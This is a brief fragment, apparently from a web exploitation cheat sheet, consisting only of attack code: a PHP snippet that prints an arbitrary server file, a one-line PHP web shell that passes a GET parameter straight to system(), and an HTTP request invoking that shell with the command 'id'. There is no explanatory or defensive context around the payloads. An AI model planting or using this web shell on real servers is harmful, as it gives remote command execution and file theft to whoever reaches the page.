`<?php echo file_get_contents('/path/to/target/file'); ?>`

`<?php echo system($_GET['command']); ?>` :

`GET /example/exploit.php?command=id HTTP/1.1`